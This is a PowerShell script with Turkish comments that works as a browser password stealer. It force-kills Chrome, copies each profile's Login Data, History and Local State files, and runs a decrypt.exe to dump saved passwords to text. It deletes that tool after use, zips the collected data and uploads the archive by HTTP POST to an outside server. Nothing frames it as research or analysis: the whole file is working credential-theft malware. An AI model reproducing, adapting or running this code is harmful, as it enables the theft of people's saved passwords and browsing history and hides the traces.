# Set destination directory for storing data
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files only if they exist
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    $fileCopied = $false  # Track if at least one file is copied

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            if (-Not (Test-Path $browserDestDir)) {
                New-Item -ItemType Directory -Path $browserDestDir
            }
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
            $fileCopied = $true
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }

    # If no files are copied, do not create directory
    if (-Not $fileCopied -and (Test-Path $browserDestDir)) {
        Remove-Item -Path $browserDestDir -Force
        Write-Host "$browserName - No files copied, directory removed."
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Get list of all profiles for Chrome
$chromeUserDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$profiles = Get-ChildItem -Path $chromeUserDataDir -Filter "Default*" -Directory

foreach ($profile in $profiles) {
    $profileName = $profile.Name
    $profileDir = $profile.FullName

    Write-Host "Processing Chrome Profile: $profileName"

    # Kill Chrome processes
    KillBrowserProcesses "chrome"

    # Copy the necessary files (Login Data, History, etc.)
    $filesToCopy = @("Login Data", "History", "Local State")
    CopyBrowserFiles $profileName $profileDir $filesToCopy

    # If Local State and Login Data exist, use decrypt.exe
    $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
    $loginDataPath = Join-Path -Path "$destDir\$profileName" -ChildPath "Login Data"
    $localStatePath = Join-Path -Path "$destDir\$profileName" -ChildPath "Local State"
    $outputPath = Join-Path -Path $destDir -ChildPath "decrypted_$profileName.txt"
    
    if (Test-Path $decryptExePath -and Test-Path $loginDataPath -and Test-Path $localStatePath) {
        try {
            # Run decrypt.exe
            $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
            Write-Host "Decrypt.exe output for $profileName: $($result)"

            if (Test-Path $outputPath) {
                Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
            } else {
                Write-Host "$profileName - Decrypted passwords not found."
            }

            # Delete decrypt.exe after use
            Remove-Item $decryptExePath -Force -ErrorAction Stop
            Write-Host "$profileName - decrypt.exe deleted after use."
        } catch {
            Write-Host "$profileName - Error running decrypt.exe: $_"
        }
    } else {
        Write-Host "$profileName - Required files or decrypt.exe not found."
    }
}

# Compress the entire BrowserData directory into a ZIP file and save to %APPDATA%\zippedbrowserdata
$zipDir = "$env:APPDATA\zippedbrowserdata"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}

$folderPath = $destDir
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"

if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
Write-Host "BrowserData directory has been compressed and saved to: $zipFilePath"

# Upload the ZIP file (optional step)
$url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si

if (Test-Path $zipFilePath) {
    try {
        # Multipart form-data boundary oluşturma
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $contentType = "multipart/form-data; boundary=$boundary"

        # Form data başlıkları
        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"

        # Dosya içeriğini oku (binary olarak)
        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)

        # Body oluşturma
        $bodyStream = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter $bodyStream
        $writer.Write($header)
        $writer.Flush()

        # Dosya verisini ekleme
        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)

        # Footer'ı ekleme
        $writer.Write($footer)
        $writer.Flush()

        $bodyStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null

        # HTTP POST isteği gönderme
        $webRequest = [System.Net.HttpWebRequest]::Create($url)
        $webRequest.Method = "POST"
        $webRequest.ContentType = $contentType
        $webRequest.ContentLength = $bodyStream.Length

        $bodyStream.CopyTo($webRequest.GetRequestStream())

        $response = $webRequest.GetResponse()
        Write-Host "Uploaded ZIP file successfully."
    } catch {
        Write-Host "Error during upload: $_"
    }
} else {
    Write-Host "ZIP file not found."
}

Write-Host "Script execution completed."
